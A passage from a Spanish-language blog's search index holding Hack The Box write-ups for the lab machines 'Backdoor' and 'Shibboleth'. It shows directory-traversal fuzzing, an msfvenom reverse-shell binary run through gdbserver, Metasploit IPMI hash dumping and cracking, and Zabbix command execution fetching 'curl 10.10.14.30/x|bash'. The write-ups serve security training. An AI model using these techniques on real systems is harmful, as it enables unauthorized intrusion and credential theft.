1224.615357 4 120 0.000000 0.996910 0.000000 0 0 /autogroup-82 S ib_clone_gtid 1045 2100.849224 38720 120 0.000000 680.801160 0.000000 0 0 /autogroup-82 S ib_srv_wkr-3 1049 1473.419354 381 120 0.000000 16.402710 0.000000 0 0 /autogroup-82 S evt_sched 1050 1258.486107 1 120 0.000000 0.555790 0.000000 0 0 /autogroup-82 S sig_handler 1051 1272.678439 4 120 0.000000 0.045260 0.000000 0 0 /autogroup-82 S xpl_accept-2 1052 2100.673274 4341 120 0.000000 135.306180 0.000000 0 0 /autogroup-82 S gtid_zip 1054 1272.680619 2 120 0.000000 0.173790 0.000000 0 0 /autogroup-82 S connection 2745 1456.449824 263 120 0.000000 77.094580 0.000000 0 0 /autogroup-82 S connection 2746 1466.696594 424 120 0.000000 67.397070 0.000000 0 0 /autogroup-82 I kworker/u256:1 3732 20245.186725 8034 120 0.000000 172.354130 0.000000 0 0 / I kworker/1:0 4547 19860.864803 12140 120 0.000000 724.512030 0.000000 0 0 / S apache2 4991 487.566296 35 120 0.000000 14.617150 0.000000 0 0 /autogroup-78 \u0026gt;R apache2 5001 492.994326 27 120 0.000000 10.675610 0.000000 0 0 /autogroup-78 S apache2 5002 487.564526 29 120 0.000000 11.517980 0.000000 0 0 /autogroup-78 S apache2 5006 493.332166 28 120 0.000000 8.924860 0.000000 0 0 /autogroup-78 S apache2 5015 487.958556 25 120 0.000000 10.375860 0.000000 0 0 /autogroup-78 S apache2 5027 487.279166 25 120 0.000000 7.637470 0.000000 0 0 /autogroup-78 I kworker/1:2 9006 20252.373780 6044 120 0.000000 396.762240 0.000000 0 0 / I kworker/u256:0 9394 20251.282761 1351 120 0.000000 25.784370 0.000000 0 0 / t true 9964 11.181754 5 120 0.000000 0.892650 0.000000 0 0 /autogroup-97 I kworker/1:1 9970 19866.729543 2 120 0.000000 0.002290 0.000000 0 0 / S sleep 10722 30630.204671 1 120 0.000000 0.702920 0.000000 0 0 /autogroup-56 \u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt;% π ~/htb/backdoor ❯ Creamos un wordlist para enumerar los procesos a los cuales podemos acceder a /proc/{pid}/cmdline para ver si encontramos informacion interesante.\n1 python -c \u0026#34;for i in range(0,10001): print(\u0026#39;/proc/\u0026#39;+str(i)+\u0026#39;/cmdline\u0026#39;)\u0026#34; \u0026gt; proc_list.txt Tras ejecutar ffuf vemos una lista de archivos cmdline.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 π ~/htb/backdoor ❯ ffuf -c -w proc_list.txt -u \u0026#34;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../FUZZ\u0026#34; -fw 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../FUZZ :: Wordlist : FUZZ: proc_list.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 1 ________________________________________________ /proc/816/cmdline [Status: 200, Size: 273, Words: 12, Lines: 1] /proc/822/cmdline [Status: 200, Size: 271, Words: 11, Lines: 1] /proc/833/cmdline [Status: 200, Size: 228, Words: 8, Lines: 1] /proc/913/cmdline [Status: 200, Size: 218, Words: 3, Lines: 1] /proc/9951/cmdline [Status: 200, Size: 241, Words: 5, Lines: 1] /proc/9959/cmdline [Status: 200, Size: 238, Words: 5, Lines: 1] :: Progress: [10001/10001] :: Job [1/1] :: 359 req/sec :: Duration: [0:01:01] :: Errors: 0 :: π ~/htb/backdoor ❯ Tras descargar cada uno de los archivos vemos multiples comandos siendo ejecutados entre ellos un servidor de gdbserver ejecutado por el usuario user y, screen por root. gdb esta siendo ejecutado en el puerto 1337 que encontramos en net/tcp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/backdoor/proc_files ❯ more * |cat :::::::::::::: 816 :::::::::::::: /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done :::::::::::::: 822 :::::::::::::: /bin/sh-cwhile true;do su user -c \u0026#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\u0026#34;; done :::::::::::::: 833 :::::::::::::: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups :::::::::::::: 913 :::::::::::::: /sbin/agetty-o-p -- \\u--nocleartty1linux :::::::::::::: 9951 :::::::::::::: suuser-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true; :::::::::::::: 9959 :::::::::::::: bash-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true; π ~/htb/backdoor/proc_files ❯ GDBServer ELF File Encontramos que es posible ejecutar un archivo elf para obtener una shell inversa tras configurar un archivo en el servidor. Creamos el archivo utilizando msfvenom.\n1 2 3 4 5 6 7 8 9 π ~/htb/backdoor ❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.30 LPORT=1338 PrependFork=true -f elf -o binary.elf [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 106 bytes Final size of elf file: 226 bytes Saved as: binary.elf π ~/htb/backdoor ❯ chmod +x binary.elf π ~/htb/backdoor ❯ Ejecutamos gdb con el archivo creado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 π ~/htb/backdoor ❯ gdb binary.elf GNU gdb (Debian 10.1-2) 10.1.90.20210103-git Copyright (C) 2021 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details. This GDB was configured as \u0026#34;x86_64-linux-gnu\u0026#34;. Type \u0026#34;show configuration\u0026#34; for configuration details. For bug reporting instructions, please see: \u0026lt;https://www.gnu.org/software/gdb/bugs/\u0026gt;. Find the GDB manual and other documentation resources online at: \u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;. For help, type \u0026#34;help\u0026#34;. Type \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;... Reading symbols from binary.elf... (No debugging symbols found in binary.elf) (gdb) Realizamos la conexión con el servidor gdb, subimos el .elf, configuramos como ejecutable el archivo para finalmente ejecutarlo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 (gdb) target extended-remote 10.10.11.125:1337 Remote debugging using 10.10.11.125:1337 Reading /lib64/ld-linux-x86-64.so.2 from remote target... warning: File transfers from remote targets can be slow. Use \u0026#34;set sysroot\u0026#34; to access files locally instead. Reading /lib64/ld-linux-x86-64.so.2 from remote target... Reading symbols from target:/lib64/ld-linux-x86-64.so.2... Reading /lib64/ld-2.31.so from remote target... Reading /lib64/.debug/ld-2.31.so from remote target... Reading /usr/lib/debug//lib64/ld-2.31.so from remote target... Reading /usr/lib/debug/lib64//ld-2.31.so from remote target... Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target... (No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2) 0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2 (gdb) remote put binary.elf binary.elf Successfully sent file \u0026#34;binary.elf\u0026#34;. (gdb) set remote exec-file /home/user/binary.elf (gdb) run The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: Reading /home/user/binary.elf from remote target... Reading /home/user/binary.elf from remote target... Reading symbols from target:/home/user/binary.elf... (No debugging symbols found in target:/home/user/binary.elf) [Detaching after fork from child process 1529] [Inferior 1 (process 1520) exited normally] (gdb) En nuestra shell con netcat vemos que logramos obtener una shell como usuario user.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/backdoor ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.30] from 10.10.11.125 [10.10.11.125] 36976 id uid=1000(user) gid=1000(user) groups=1000(user) which python which python3 /usr/bin/python3 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; user@Backdoor:/home/user$ pwd /home/user user@Backdoor:/home/user$ Metasploit Encontramos que existe un exploit de metasploit que permite ejecutar comandos. Tras configurar el exploit en metasploit obtuvimos una shell con el usuario user y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 msf6 exploit(multi/gdb/gdb_server_exec) \u0026gt; show options Module options (exploit/multi/gdb/gdb_server_exec): Name Current Setting Required Description ---- --------------- -------- ----------- EXE_FILE /bin/true no The exe to spawn when gdbserver is not attached to a process. RHOSTS 10.10.11.125 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 1337 yes The target port (TCP) Payload options (linux/x64/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.30 yes The listen address (an interface may be specified) LPORT 12345 yes The listen port Exploit target: Id Name -- ---- 1 x86_64 (64-bit) msf6 exploit(multi/gdb/gdb_server_exec) \u0026gt; msf6 exploit(multi/gdb/gdb_server_exec) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.30:12345 [*] 10.10.11.125:1337 - Performing handshake with gdbserver... [*] 10.10.11.125:1337 - Stepping program to find PC... [*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103... [*] 10.10.11.125:1337 - Executing the payload... [*] Command shell session 1 opened (10.10.14.30:12345 -\u0026gt; 10.10.11.125:38856 ) at 2021-11-21 01:05:32 +0000 whoami user id uid=1000(user) gid=1000(user) groups=1000(user) ls -lah total 36K drwxr-xr-x 6 user user 4.0K Nov 10 14:18 . drwxr-xr-x 3 root root 4.0K Nov 10 14:18 .. lrwxrwxrwx 1 root root 9 Jul 18 21:43 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 user user 3.7K Feb 25 2020 .bashrc drwx------ 2 user user 4.0K Nov 10 14:18 .cache drwx------ 3 user user 4.0K Nov 10 14:18 .config drwx------ 4 user user 4.0K Nov 10 14:18 .gnupg drwxrwxr-x 3 user user 4.0K Nov 10 14:18 .local -rw-r--r-- 1 user user 807 Feb 25 2020 .profile -rw-r----- 1 root user 33 Nov 20 23:05 user.txt cat user.txt 98c7ff1956a8e023beac2c2dc9a6d2c5 Privesc Enumerando los procesos en ejecucion por el usuario root vemos que esta ejecutando una sesion suelta (detached), tal y como se mostraba en los archivos proc.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 user@Backdoor:~$ ps -ef|grep root ps -ef|grep root [.. snip ..] root 795 1 0 03:45 ? 00:00:00 /usr/sbin/cron -f root 797 795 0 03:45 ? 00:00:00 /usr/sbin/CRON -f root 798 795 0 03:45 ? 00:00:00 /usr/sbin/CRON -f root 816 798 0 03:45 ? 00:00:01 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done root 822 797 0 03:45 ? 00:00:00 /bin/sh -c while true;do su user -c \u0026#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\u0026#34;; done root 833 1 0 03:45 ? 00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups root 906 1 0 03:45 ? 00:00:00 SCREEN -dmS root root 908 906 0 03:45 pts/0 00:00:00 -/bin/bash root 913 1 0 03:45 tty1 00:00:00 /sbin/agetty -o -p -- \\u --noclear tty1 linux [.. snip ..] user@Backdoor:~$ Nos conectamos a la sesion como invitado logrando obtener una shell como root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ script /dev/null $ export TERM=\u0026#39;vt100\u0026#39; $ screen -x root/root root@Backdoor:~# whoami; id whoami; id root uid=0(root) gid=0(root) groups=0(root) root@Backdoor:~# cd /root cd /root root@Backdoor:~# ls ls root.txt root@Backdoor:~# cat root.txt cat root.txt 1d42d242599341801ed69f61f309d37f root@Backdoor:~# ","description":"Backdoor corre WordPress con un plugin vulnerable lo que nos permitió obtener información de los procesos en ejecución, encontramos que corre un servidor de gdb por donde accedimos a un primer usuario. Tras conectarnos a una sesion screen logramos acceso como root.","id":30,"section":"posts","tags":["wordpress","wpscan","screen","gdbserver","metasploit","directory traversal","lfi"],"title":"Hack The Box - Backdoor","uri":"https://sckull.github.io/posts/backdoor/"},{"content":"\rShibboleth expone IPMI por donde obtuvimos un hash que nos permitió acceder al panel de Zabbix, en este último logramos ejecutar commandos y acceder a la máquina. Reutilizando una contraseña nos dio acceso a un segundo usuario. Finalmente explotamos una vulnerabilidad en MySQL lo que nos permitió escalar privilegios.\nNombre Shibboleth OS Linux Puntos 30 Dificultad Media IP 10.10.11.124 Maker knightmare mrb3n Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.6, 6, 5.9, 4.1, 4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[9, 10, 9, 1, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap Nmap muestra unicamente el puerto http (80) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 # ports=$(nmap -Pn -p- --min-rate=3000 10.10.11.124 | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) # nmap -p$ports -sC -sV 10.10.11.124 -o nmap # Nmap 7.91 scan initiated Thu Nov 25 01:09:55 2021 as: nmap -p80 -sC -sV -o nmap 10.10.11.124 Nmap scan report for shibboleth.htb (10.10.11.124) Host is up (0.44s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: FlexStart Bootstrap Template - Index Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Nov 25 01:10:09 2021 -- 1 IP address (1 host up) scanned in 14.45 seconds Web Site Tras realizar una solicitud en el puerto 80 nos redirige a un dominio: shibboleth.htb, el cual agregamos a nuestro archivo /etc/hosts.\n1 2 3 4 5 6 7 8 π ~/htb/shibboleth ❯ curl -sI 10.10.11.124 HTTP/1.1 302 Found Date: Thu, 25 Nov 2021 01:31:21 GMT Server: Apache/2.4.41 (Ubuntu) Location: http://shibboleth.htb/ Content-Type: text/html; charset=iso-8859-1 π ~/htb/shibboleth ❯ Al visitar el sitio web vemos una plantilla estatica donde no se muestra mucha informacion, el formulario al final de la pagina no parece funcionar y, con el error que muestra logramos obtener el codigo fuente de esta plantilla en bootstrapmade.\nEn el footer de la pagina vemos que mencionan Zabbix \u0026amp; Bare Metal BMC automation, probablemente exista Zabbix y algun tipo de sistema para automatizar procesos.\nDirectory Brute Forcing Tras ejecutar feroxbuster no se mostró ningun tipo de directorio en relacion a lo mencionado en el footer.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/shibboleth ❯ feroxbuster -u http://shibboleth.htb/ -w $MD -x php -d 2 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://shibboleth.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php] 🔃 Recursion Depth │ 2 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 9l 28w 317c http://shibboleth.htb/assets 301 9l 28w 321c http://shibboleth.htb/assets/img 301 9l 28w 316c http://shibboleth.htb/forms 301 9l 28w 321c http://shibboleth.htb/assets/css 200 1l 8w 44c http://shibboleth.htb/forms/contact.php 301 9l 28w 320c http://shibboleth.htb/assets/js 301 9l 28w 324c http://shibboleth.htb/assets/vendor Subdominios Utilizando ffuf logramos enumerar tres subdominios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 π ~/htb/shibboleth ❯ ffuf -w bitquark-subdomains-top100000.txt -H \u0026#34;Host: FUZZ.shibboleth.htb\u0026#34; -u http://shibboleth.htb -fw 18 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://shibboleth.htb :: Wordlist : FUZZ: bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.shibboleth.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 18 ________________________________________________ monitor [Status: 200, Size: 3686, Words: 192, Lines: 30] monitoring [Status: 200, Size: 3686, Words: 192, Lines: 30] zabbix [Status: 200, Size: 3686, Words: 192, Lines: 30] :: Progress: [100000/100000] :: Job [1/1] :: 364 req/sec :: Duration: [0:07:06] :: Errors: 0 :: π ~/htb/shibboleth ❯ Zabbix En los tres subdominios encontrados se muestra el login de Zabbix, con los links que se muestran por debajo podemos decir que la version es zabbix 5.0.\nSi revisamos algun exploit o vulnerabilidad para esta version se muestra un XSS pero es necesario ingresar como administrador, tambien encontramos el CVE-2021-27927 aunque es necesaria la interacción del administrador.\n1 2 3 4 5 6 7 8 π ~/htb/shibboleth ❯ searchsploit zabbix 5.0 ---------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------- --------------------------------- Zabbix 5.0.0 - Stored XSS via URL Widget Iframe | php/webapps/49202.txt ---------------------------------------------------------- --------------------------------- Shellcodes: No Results π ~/htb/shibboleth ❯ BMC Server La informacion del footer nos llevo a BMC Server Automation además encontramos que utiliza el puerto UDP 623 aunque depende del proveedor algunos ofrecen una interfaz de administracion web, telnet ssh y el protocolo IPMI (udp/623).\nTras escanear la maquina vemos que el puerto 623 está abierto.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/shibboleth ❯ sudo nmap -n -sU -p 623 shibboleth.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-25 01:43 UTC Nmap scan report for shibboleth.htb (10.10.11.124) Host is up (0.23s latency). PORT STATE SERVICE 623/udp open asf-rmcp Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds π ~/htb/shibboleth ❯ IPMI Hacktricks lista algunas vulnerabilidades en el protocolo IPMI, donde vemos algunos modulos auxiliares y exploits de metasploit. La primera vulnerabilidad parece estar presente segun la ejecucion del modulo en metasploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 π ~/htb/shibboleth ❯ msfconsole -q msf6 \u0026gt; use auxiliary/scanner/ipmi/ipmi_cipher_zero msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) \u0026gt; show options Module options (auxiliary/scanner/ipmi/ipmi_cipher_zero): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 623 yes The target port (UDP) THREADS 10 yes The number of concurrent threads msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) \u0026gt; set rhosts shibboleth.htb rhosts =\u0026gt; shibboleth.htb msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) \u0026gt; run [*] Sending IPMI requests to 10.10.11.124-\u0026gt;10.10.11.124 (1 hosts) [+] 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) \u0026gt; Al realizar una enumeracion con una lista de usuarios no logramos encontrar alguno.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/shibboleth ❯ while read line; do echo $line \u0026amp;\u0026amp; ipmitool -C 0 -H shibboleth.htb -U $line -P root user list; done \u0026lt; top-usernames-shortlist.txt root Invalid user name Error: Unable to establish LAN session Error: Unable to establish IPMI v1.5 / RMCP session [.. snip ..] zabbix Invalid user name Error: Unable to establish LAN session Error: Unable to establish IPMI v1.5 / RMCP session π ~/htb/shibboleth ❯ La segunda vulnerabilidad de igual forma está presente, por lo que nos permitió obtener el hash del usuario Administrator utilizando wordlist de metasploit para usuario y contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; show options Module options (auxiliary/scanner/ipmi/ipmi_dumphashes): Name Current Setting Required Description ---- --------------- -------- ----------- CRACK_COMMON true yes Automatically crack common passwords as they are obtained OUTPUT_HASHCAT_FILE no Save captured password hashes in hashcat format OUTPUT_JOHN_FILE no Save captured password hashes in john the ripper format PASS_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_passw yes File containing common passwords for offline cracking, one per line ords.txt RHOSTS shibboleth.htb yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 623 yes The target port SESSION_MAX_ATTEMPTS 5 yes Maximum number of session retries, required on certain BMCs (HP iLO 4, etc) SESSION_RETRY_DELAY 5 yes Delay between session retries in seconds THREADS 1 yes The number of concurrent threads (max one per host) USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users yes File containing usernames, one per line .txt msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; run [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:3eea1697840a00006d671b96156fffe6876482d6e609077b3bd1b85e1c527df0f33fad868ed1afeea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:5070ad3baff2f7a8e31447d7fdb0406d9d7ca623 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; La descripcion del modulo nos muestra un script que permite crackear el hash y además el tipo de hash en hashcat.\n1 2 3 4 5 6 Description: This module identifies IPMI 2.0-compatible systems and attempts to retrieve the HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300. Utilizando el script mencionado y el wordlist Rockyou logramos obtener la ontraseña del usuario en texto plano.\n1 2 3 4 5 6 π ~/htb/shibboleth ❯ /usr/share/metasploit-framework/tools/password/hmac_sha1_crack.rb hashes_ipmi $ROCK [*] Found 0 passwords with 1 left (176863/s) [*] Found 0 passwords with 1 left (174738/s) Administrator:4adb246d82050000260b44a85fb2076bed27820cdd7f85ade6ab78d9a16aee08fa2b3fde6173a135a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:603a52b1de3168450f23cd8e3fab3425f857e49d:ilovepumkinpie1 [*] Cracked 1 passwords with 0 left (172136/s) π ~/htb/shibboleth ❯ Zabbix - User Las credenciales nos dieron acceso al dashboard de Zabbix, aunque dicho usuario al que accedimos no es un administrador.\nTras investigar acerca de ejecucion de comandos en Zabbix encontramos un post - Zabbix donde muestra como ejecutar comandos de manera remota, vemos que utiliza system.run[\u0026quot;\u0026quot;] en un test con items. Replicando esto mismo en un item agregamos un comando para realizr un ping a nuestra maquina en: Configuration \u0026gt; Hosts \u0026gt; Items \u0026gt; Create Item \u0026gt; Key \u0026gt; system.run[\u0026quot;ping -c 4 10.10.14.30\u0026quot;], finalmente Add.\nVemos que el item fue creado y guardado.\nAccedemos y ejecutamos este en Test y Get value and test.\nEn nuestra maquina obtuvimos ping desde Shibboleth.\n1 2 3 4 5 6 7 8 9 π ~/htb/shibboleth ❯ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 00:22:40.755421 IP shibboleth.htb \u0026gt; 10.10.14.30: ICMP echo request, id 4, seq 1, length 64 00:22:40.755436 IP 10.10.14.30 \u0026gt; shibboleth.htb: ICMP echo reply, id 4, seq 1, length 64 00:22:41.759407 IP shibboleth.htb \u0026gt; 10.10.14.30: ICMP echo request, id 4, seq 2, length 64 00:22:41.759589 IP 10.10.14.30 \u0026gt; shibboleth.htb: ICMP echo reply, id 4, seq 2, length 64 00:22:42.758613 IP shibboleth.htb \u0026gt; 10.10.14.30: ICMP echo request, id 4, seq 3, length 64 00:22:42.758664 IP 10.10.14.30 \u0026gt; shibboleth.htb: ICMP echo reply, id 4, seq 3, length 64 Shell Ejecutamos una shell inversa, aunque esta moría al poco tiempo.\n1 2 3 4 5 6 π ~/htb/shibboleth ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.30] from shibboleth.htb [10.10.11.124] 45862 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ π ~/htb/shibboleth Utilizamos Shells, para crear el archivo x con multiples shells. Con ello modificamos el payload del Item en Zabbix para ejecutar una de estas.\n1 system.run[\u0026#34;curl 10.10.14.30/x|bash\u0026#34;] Finalmente realizamos un test del Item lo que nos dio acceso a la maquina como zabbix.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/shibboleth ❯ rlwrap nc -lvp 1337 listening on [any] 1337 ... connect to [10.10.14.30] from shibboleth.htb [10.10.11.124] 60260 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; zabbix@shibboleth:/$ whoami; id zabbix uid=110(zabbix) gid=118(zabbix) groups=118(zabbix) zabbix@shibboleth:/$ Ipmi-svc - User Utilizando la contraseña que encontramos anteriormente logramos acceder acceso al usuario ipmi-svc y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 zabbix@shibboleth:/$ whoami; id zabbix uid=110(zabbix) gid=118(zabbix) groups=118(zabbix) zabbix@shibboleth:/$ cd /home zabbix@shibboleth:/$ ls ipmi-svc zabbix@shibboleth:/$ cd ipmi-svc zabbix@shibboleth:/$ ls -lah total 32K drwxr-xr-x 3 ipmi-svc ipmi-svc 4.0K Oct 16 12:23 . drwxr-xr-x 3 root root 4.0K Oct 16 12:24 .. lrwxrwxrwx 1 ipmi-svc ipmi-svc 9 Apr 27 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ipmi-svc ipmi-svc 220 Apr 24 2021 .bash_logout -rw-r--r-- 1 ipmi-svc ipmi-svc 3.7K Apr 24 2021 .bashrc drwx------ 2 ipmi-svc ipmi-svc 4.0K Apr 27 2021 .cache lrwxrwxrwx 1 ipmi-svc ipmi-svc 9 Apr 28 2021 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 ipmi-svc ipmi-svc 807 Apr 24 2021 .profile -rw-r----- 1 ipmi-svc ipmi-svc 33 Nov 28 00:29 user.txt 